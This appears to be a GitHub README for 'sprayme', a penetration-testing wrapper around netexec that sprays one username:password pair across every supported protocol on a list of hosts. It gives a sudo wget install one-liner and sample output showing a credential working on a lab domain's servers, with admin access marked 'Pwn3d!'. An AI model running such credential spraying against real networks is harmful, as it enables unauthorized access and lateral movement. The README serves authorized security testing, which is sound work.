# sprayme
### Spray literally everything you can! 
<img src="https://github.com/user-attachments/assets/43306087-42cf-48fb-b118-0c416d65835a" alt="kcme" width="200"/>    

# Description
This was developed to solve the issue of spraying several protocols simultaneously via netexec / nxc. The tool 𝘀𝗽𝗿𝗮𝘆𝗺𝗲 dynamically identifies all the protocols netexec / nxc has available then takes a simple 'USERNAME:PASSWORD' and <HOSTS_FILE> to spray everyhing into infinity!

# Requirements
```
sudo apt install nxc
```
# Install
```
sudo wget https://github.com/DaddyBigFish/sprayme/raw/refs/heads/main/sprayme -O /usr/local/bin/sprayme; sudo chmod +x /usr/local/bin/sprayme
```
# Usage
```
sprayme 'joekerr:J5KCwKruINyCJBKd1dZU' HOSTS_10.10.120.X

10.10.120.1     389    DC01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.1     135    DC01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.15    135    SRV01            [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU (Pwn3d!)
10.10.120.10    135    MX01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.5     135    FS01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.1     445    DC01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.15    445    SRV01            [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU (Pwn3d!)
10.10.120.10    445    MX01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.5     445    FS01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.15    5985   SRV01            [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU (Pwn3d!)
10.10.120.10    3389   MX01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.5     3389   FS01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
10.10.120.1     389    DC01             [+] boomboom.local\joekerr:J5KCwKruINyCJBKd1dZU
```
